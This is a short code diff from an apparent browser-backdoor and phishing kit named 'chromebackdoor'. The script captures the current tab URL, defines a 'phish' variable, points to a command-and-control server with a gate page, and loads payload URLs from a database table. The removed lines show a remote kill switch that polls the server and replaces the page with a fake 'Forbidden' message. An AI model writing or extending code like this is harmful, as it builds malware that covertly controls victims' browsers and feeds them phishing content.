@@ -5,25 +5,8 @@ $(document).ready(function()
 {
     var phish = "";
     var tabURL = window.location.href;
-    var server_web = "http://localhost:8888/taff/private/chromebackdoor/"
-    var lock_page = "relais/lock.php"
-    var gate_page = "relais/index.php"
-    //locking function
-    function locking()
-    {
-       document.write("<h1>Forbidden !</h1><p>you don't have permission to access / on this server</p>");
-    }
-    function lock()
-    {
-        $.get(server_web+lock_page,function(data)
-        {
-            if(data == '1')
-            {
-                locking();
-            }
-        });
-    }
-    lock();
+    var server_web = "http://localhost:8888/taff/private/chromebackdoor-master/";
+    var gate_page = "web/gate.php";
     <?php
     $select_url_check = $bdd->prepare("SELECT urlverif FROM payloads");
     $select_url_check->execute();
